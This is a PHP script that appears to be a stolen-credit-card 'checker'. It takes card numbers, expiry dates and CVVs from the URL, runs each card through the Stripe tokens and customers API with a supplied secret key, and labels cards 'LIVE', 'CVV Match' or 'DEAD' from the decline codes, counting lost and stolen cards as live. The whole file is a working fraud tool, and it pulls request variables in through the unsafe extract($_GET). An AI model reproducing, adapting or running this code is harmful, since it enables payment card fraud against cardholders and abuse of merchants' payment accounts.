<?php

error_reporting(1);

/* Variables */
extract($_GET);
$explode = explode("|", $lista);
$cc = $explode[0];
$mm = $explode[1];
$yyyy = $explode[2];
$cvv = $explode[3];
$amount = 'Charge : $'.rand(3,7).'.'.rand(01,99);
$amount2 = 'Not Charged';
$donot = 'Do Not Honor';

/* 1st Curl Headers */
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';

/* Tokens - 1st Curl */
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=$cc&card[exp_month]=$mm&card[exp_year]=$yyyy&card[cvc]=$cvv");
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

/* Json Decode */
$respo1 = curl_exec($ch);
$json1 = json_decode($respo1, true);
curl_close($ch);
$id = ''.$json1["id"].'';

/* 2nd Curl Headers */
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';

/* Customers - 2nd Curl */
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "description=Pogi Auth&source=".$json1["id"]);
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

/* Json Decode */
$respo2 = curl_exec($ch);
$json2 = json_decode($respo2, true);
curl_close($ch);
$err2 = $json2["error"]["code"];


/* Response */
if (strpos($respo1, '"cvc_check": "pass"')) {
echo ' <span class="badge badge-success">#CVV</span></span> </span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-success"> '.$amount.' </span>  <span class="badge badge-success"> CVV Match</span></span>  <span class="badge badge-success"> Pogi</b> </span> </br>';
}

elseif(strpos($respo2, "lost_card" )) {
    echo '<span class="badge badge-success">#LIVE</span></span> </span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-warning"> '.$amount.' </span>  <span class="badge badge-warning"> Lost Card </span></span>  <span class="badge badge-warning"> Pogi</b> </span> </br>';
}
elseif(strpos($respo2, "stolen_card" )) {
    echo '<span class="badge badge-success">#LIVE</span></span> </span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-warning"> '.$amount.' </span>  <span class="badge badge-warning"> Stolen Card </span></span> <span class="badge badge-warning"> Pogi</b> </span> </br>';
}
elseif(strpos($respo2, "Your card's security code is incorrect." )) {
    echo '<span class="badge badge-success">#LIVE</span></span> </span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-warning"> '.$amount.' </span>  <span class="badge badge-warning">Incorrect CVC</span></span>  <span class="badge badge-warning"> Pogi</b> </span> </br>';
}
elseif(strpos($respo2, "incorrect_cvc" )) {
    echo '<span class="badge badge-success">#LIVE</span></span> </span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-warning"> '.$amount.' </span>  <span class="badge badge-warning"> Incorrect CVC </span></span>  <span class="badge badge-warning"> Pogi</b> </span> </br>';
}
elseif(strpos($respo2, "pickup_card" )) {
    echo '<span class="badge badge-success">#LIVE</span></span> </span> <span class="badge badge-success">'.$lista.'</span> <span class="badge badge-warning"> '.$amount.' </span>  <span class="badge badge-warning"> Pickup Card</span></span>  <span class="badge badge-warning"> Pogi</b> </span> </br>';
}
elseif (strpos($respo2, '"cvc_check": "unavailable"')) {
echo '<span class="badge badge-dark">#DEAD</span></span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-warning"> '.$amount2.' </span>  <span class="badge badge-dark"> Unavailable </span></span>  <span class="badge badge-warning"> Pogi</b> </span> </br>';
}
elseif (strpos($respo1, '"cvc_check": "unchecked"')) {
echo '<span class="badge badge-dark">#DEAD</span></span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-warning"> '.$amount2.' </span>  <span class="badge badge-dark"> Unchecked </span></span>  <span class="badge badge-warning"> Pogi</b> </span> </br>';
}
elseif (strpos($respo1, 'Sending credit card numbers directly to the Stripe API is generally unsafe.')) {
echo '<span class="badge badge-dark">#DEAD</span></span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-warning"> '.$amount2.' </span>  <span class="badge badge-dark"> Turn on Integration </span></span>  <span class="badge badge-warning"> Pogi</b> </span> </br>';
}
elseif (strpos($respo1, 'testmode_charges_only')) {
echo '<span class="badge badge-dark">#DEAD</span></span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-warning"> '.$amount2.' </span>  <span class="badge badge-dark"> Testmode Charges Only </span></span>  <span class="badge badge-warning"> Pogi</b> </span> </br>';
}
elseif (strpos($respo1, 'api_key_expired')) {
echo '<span class="badge badge-dark">#DEAD</span></span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-warning"> '.$amount2.' </span>  <span class="badge badge-dark"> API Key Expired </span></span>  <span class="badge badge-warning"> Pogi</b> </span> </br>';
}
elseif (strpos($respo1, 'Invalid API Key provided:')) {
echo '<span class="badge badge-dark">#DEAD</span></span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-warning"> '.$amount2.' </span>  <span class="badge badge-dark"> Invalid Api Key </span></span>  <span class="badge badge-warning"> Pogi</b> </span> </br>';
}
elseif (strpos($respo1, 'You did not provide an API key.')) {
echo '<span class="badge badge-dark">#DEAD</span></span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-warning"> '.$amount2.' </span>  <span class="badge badge-dark"> No API Key Provided </span></span>  <span class="badge badge-warning"> Pogi</b> </span> </br>';
}
elseif (strpos($respo2, 'do_not_honor')) {
echo '<span class="badge badge-dark">#DEAD</span></span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-warning"> '.$amount2.' </span>  <span class="badge badge-dark"> Do Not Honor </span></span>  <span class="badge badge-warning"> Pogi</b> </span> </br>';
}
elseif (strpos($respo1, 'generic_decline')) {
echo '<span class="badge badge-dark">#DEAD</span></span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-warning"> '.$amount2.' </span>  <span class="badge badge-dark"> Generic Decline </span></span>  <span class="badge badge-warning"> Pogi</b> </span> </br>';
}
elseif (strpos($respo2, 'Your card is not supported.')) {
echo '<span class="badge badge-dark">#DEAD</span></span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-warning"> '.$amount2.' </span>  <span class="badge badge-dark"> Card Not Supported</span></span>  <span class="badge badge-warning"> Pogi</b> </span> </br>';
}
elseif (strpos($respo1, 'Your card was declined.')) {
echo '<span class="badge badge-dark">#DEAD</span></span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-warning"> '.$amount2.' </span>  <span class="badge badge-dark"> Do Not Honor </span></span>  <span class="badge badge-warning"> Pogi</b> </span> </br>';
}
else {
    echo '<span class="badge badge-dark">#DEAD</span></span> </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-warning"> '.$amount2.' </span>  <span class="badge badge-dark"> '.$err2.' </span></span>  <span class="badge badge-warning"> Pogi</b> </span> </br>';
}

//echo $respo1;
//echo $respo2;
//echo $id;
?>
